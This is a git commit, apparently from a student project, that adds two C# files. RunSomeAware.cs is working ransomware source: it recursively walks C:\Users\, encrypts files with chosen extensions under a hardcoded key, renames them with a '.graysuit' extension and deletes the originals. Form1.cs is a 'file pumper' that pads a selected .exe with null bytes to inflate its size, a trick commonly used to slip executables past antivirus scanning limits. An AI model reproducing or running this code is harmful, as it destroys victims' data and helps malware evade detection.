b412206dc5f2fa3cf06a6cfc67710b6285afa337
unknown <buixuanthaivtabs@gmail.com>
2021-06-08 18:45:49 +0700

    first commit

---
+++ DoAn/Ransomeware/RunSomeAware.cs
@@ -0,0 +1,67 @@
+using System;
+using System.IO;
+using System.Security.Cryptography;
+using System.Text;
+using System.Diagnostics;
+
+class RunSomeAware
+{
+    public static string key = "MyPrivateKey";
+    public static string CrypterExt = ".graysuit";
+    public static string ParentDirectory = @"C:\Users\";
+    public static string[] AllowedExt = { ".png", ".html", ".7z", ".cpp", ".js", ".txt", CrypterExt };
+    public static Mode mode = Mode.Encrypt;
+
+    public static long BytesRead = 0;
+    public enum Mode {Encrypt=1,Decrypt=0 };
+    public static void Main()
+    {
+        Stopwatch watch = Stopwatch.StartNew();
+        Start(ParentDirectory);
+        watch.Stop();
+        Console.WriteLine("Speed:" + (BytesRead / (watch.ElapsedMilliseconds * 0.001 * 1024 * 1024)) + " MB/s");
+    }
+    static void Start(string ParentDir)
+    {
+        foreach (string file in Directory.GetFiles(ParentDir))
+        {
+            if (Contain(new FileInfo(file).Extension, AllowedExt))
+            {
+                Crypt(file, mode);
+                BytesRead += new FileInfo(file).Length;
+                File.Delete(file);
+                Console.WriteLine((file.EndsWith(CrypterExt) ? "De" : "En") + "crypted : " + file);
+            }
+        }
+        foreach (string dir in Directory.GetDirectories(ParentDir)) try { Start(dir); } catch {}
+    }
+
+    static void Crypt(string file,Mode mode)
+    {
+        if (mode == Mode.Encrypt && file.EndsWith(CrypterExt)) throw new Exception("Error! File is already encrypted. FilePath:"+ file);
+        using (FileStream filestream = File.Open(file, FileMode.Open, FileAccess.Read))
+        {
+            using (FileStream stream = new FileStream(mode==Mode.Decrypt ? file.Replace(CrypterExt, "") : file + CrypterExt, FileMode.Create, FileAccess.Write))
+            {
+                using (Rijndael AES = new RijndaelManaged())
+                {
+                    AES.Key = (new SHA256Managed()).ComputeHash(Encoding.ASCII.GetBytes(key));
+                    AES.Mode = CipherMode.ECB;
+                    using (CryptoStream crypto = new CryptoStream(stream, mode == Mode.Decrypt ? AES.CreateDecryptor() : AES.CreateEncryptor(), CryptoStreamMode.Write))
+                    {
+                        byte[] buffer = new byte[filestream.Length];
+                        while (filestream.Read(buffer, 0, buffer.Length) > 0)
+                        {
+                            crypto.Write(buffer, 0, buffer.Length);
+                        }
+                    }
+                }
+            }
+        }
+    }
+    static bool Contain(string value, string[] values)
+    {
+        foreach (string val in values) if (val.Trim() == value.Trim()) return true;
+        return false;
+    }
+}
---
+++ DoAn/XFilePumper-main/Form1.cs
@@ -0,0 +1,69 @@
+﻿using System;
+using System.ComponentModel;
+using System.IO;
+using System.Windows.Forms;
+using System.Threading;
+
+namespace AddBytes
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load_1(object sender, EventArgs e)
+        {
+        }
+
+        private void button1_Click_1(object sender, EventArgs e)
+        {
+            var pump = new Thread(Pump);
+            pump.Start();
+        }
+
+
+        public void Pump()
+        {
+            try
+            {
+                var file = File.OpenWrite(textBox1.Text);
+                var siz = file.Seek(0, SeekOrigin.End);
+                var size = Convert.ToInt64(textBox2.Text);
+                decimal bite = size * 1024 * 1024;
+                while (siz < bite)
+                {
+                    siz++;
+                    file.WriteByte(0);
+                }
+                file.Close();
+                MessageBox.Show("File Pumped!");
+            }
+            
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }   
+        
+        }
+        
+        private void button2_Click_1(object sender, EventArgs e)
+        {
+            OpenFileDialog openFileDialog1 = new OpenFileDialog();
+            openFileDialog1.DefaultExt = "exe";
+            openFileDialog1.Filter = "exe files (*.exe)|*.exe";
+            openFileDialog1.FilterIndex = 1;
+            openFileDialog1.InitialDirectory = @".";
+            openFileDialog1.Title = "Chon tep..."; 
+            if (openFileDialog1.ShowDialog(this) == DialogResult.OK)
+            {
+                textBox1.Text = string.Empty;
+                textBox1.Text = openFileDialog1.FileName;
+            }
+            
+        }
+        
+    }
+    
+}
